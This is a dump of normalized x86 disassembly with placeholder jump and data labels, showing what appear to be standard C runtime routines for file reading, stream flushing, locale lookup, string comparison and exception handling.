jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1001b35d
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1001831a
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000e8db
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1000e8db
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100169d4
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_10018191
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_100182b6
pop ecx
test eax eax
jne r-xdata
call sub_100169d4
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10018191
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1001826d
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_10017945
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1001b4d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_100196ac
test eax eax
je r-xdata
push 0xa
call sub_100134f5
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_100196b9
pop ecx
push 0x3
call sub_10011e59
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_1000b660
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_1001b5e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b61c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_1001460a
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_1000c036
pop ecx
cmp eax esi
je r-xdata
call sub_1001a250
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_1001b75b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001b61c
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b798
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1001b7b8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1000ac69
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1001b7fd
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1001b7fd
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1001b7b8
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1001b8ad
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1001b8cc
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1001b8a4
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1001b8ad
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1001b8cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1000afe5
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1000e8db
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001850c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1001aede
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10017724
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b9e4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001b8cf
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_1001ba10
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1001ba71
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1000e8db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_1001a785
push esi
mov ebx eax
call sub_1001c4b9
push esi
call sub_1001831a
push eax
call sub_1001c3ec
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_1000bf59
pop ecx
mov [ esi + 0x1c ] edi
sub_1001bae8
push 0xc
push r--data
call sub_10011ecc
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1000e8db
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10016aab
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_1001ba71
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001bb5c
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_10011f11
retn
mov eax [ ebp - 0x1c ]
sub_1001bb64
push 0x10
push r--data
call sub_10011ecc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8db
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011f11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1001aabe
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1000e8db
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1001aa47
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001bc3b
mov eax [ ebp - 0x1c ]
call sub_1000e8ee
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_1001bc64
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_1001bc91
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1000e8ee
and [ eax ] 0x0
call sub_1000e8db
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1000e8ee
mov [ eax ] ebx
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1000e8ee
mov [ eax ] ebx
call sub_1000e8db
mov [ eax ] 0x9
jmp r-xdata
call sub_1000e8ee
mov [ eax ] ebx
call sub_1000e8db
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_100119e5
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100178c0
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1000e8db
mov [ eax ] 0xc
call sub_1000e8ee
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_1000e901
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_1000e8db
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_100178c0
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_100178c0
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_100178c0
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_1001c253
push 0x10
push r--data
call sub_10011ecc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_1000e8ee
and [ eax ] 0x0
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] esi
call sub_1000e8db
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_10011f11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_1001aabe
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_1000e8ee
mov [ eax ] esi
call sub_1000e8db
mov [ eax ] 0x16
jmp r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
